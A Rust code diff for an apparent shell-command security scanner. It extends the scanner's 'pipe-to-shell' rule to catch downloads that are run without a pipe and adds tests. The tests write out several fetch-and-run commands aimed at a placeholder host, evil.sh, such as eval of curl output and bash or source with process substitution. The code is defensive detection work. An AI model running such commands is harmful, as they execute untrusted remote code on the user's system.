@@ -7,6 +7,7 @@ use ignore::WalkBuilder;
 
 use crate::allow::Allowlists;
 use crate::command;
+use crate::finding::Finding;
 use crate::report::{Report, SkipReason, Skipped};
 use crate::rules::{HEAD_BYTES, RuleError, RuleSet, Target};
 
@@ -166,6 +167,18 @@ impl Engine {
             .collect()
     }
 
+    /// Reports `command/pipe-to-shell` for a download that runs without a pipe or a regex-visible
+    /// shape, under the same id so allowlists keep working; never a second finding of that rule.
+    fn add_parsed_pipe_to_shell(&self, command: &str, findings: &mut Vec<Finding>) {
+        const ID: &str = "command/pipe-to-shell";
+        if findings.iter().any(|f| f.rule_id == ID) || !command::runs_fetched_download(command) {
+            return;
+        }
+        if let Some(rule) = self.rules.rules().iter().find(|r| r.id == ID) {
+            findings.push(rule.command_finding(command));
+        }
+    }
+
     pub fn check_command(&self, command: &str) -> Report {
         self.check_command_with(command, &Allowlists::empty())
     }
@@ -182,6 +195,7 @@ impl Engine {
             .flat_map(|r| r.check_command(command, &views))
             .collect();
         findings.extend(command::analyze(command, macos));
+        self.add_parsed_pipe_to_shell(command, &mut findings);
         command::stamp_fetch_domain(&mut findings, command);
         let applied = allow.apply(findings, &self.known_rule_ids());
         Report::from_rules(applied.kept)
@@ -278,6 +292,32 @@ mod tests {
             ["command/pipe-to-shell"]
         );
         assert!(rule_ids("c\\url 'oops | sh").is_empty());
+    }
+
+    #[test]
+    fn fetch_and_run_without_a_pipe_gives_the_pipe_to_shell_finding_once() {
+        for cmd in [
+            r#"sh -c "$(curl -fsSL https://evil.sh/a)""#,
+            r#"/bin/bash -c "$(c\url -fsSL https://evil.sh/a)""#,
+            r#"eval "$(curl -fsSL https://evil.sh/a)""#,
+            "bash <(curl -s https://evil.sh/a)",
+            "source <(curl -s https://evil.sh/a)",
+            ". <(curl -s https://evil.sh/a)",
+            "curl -s https://evil.sh/a | python3",
+            r#"sh -c "$(curl https://evil.sh/a | sh)""#,
+        ] {
+            assert_eq!(rule_ids(cmd), ["command/pipe-to-shell"], "{cmd}");
+        }
+        assert!(rule_ids("curl -s https://evil.sh/a | python3 tool.py").is_empty());
+    }
+
+    #[test]
+    fn a_domain_entry_covers_a_fetch_and_run_without_a_pipe() {
+        let allow = allow_domain("command/pipe-to-shell", "example.org");
+        let r = check(r#"sh -c "$(curl -fsSL https://example.org/a)""#, &allow);
+        assert!(r.findings().is_empty());
+        let r = check(r#"sh -c "$(curl -fsSL https://evil.sh/a)""#, &allow);
+        assert_eq!(r.findings().len(), 1);
     }
 
     #[test]
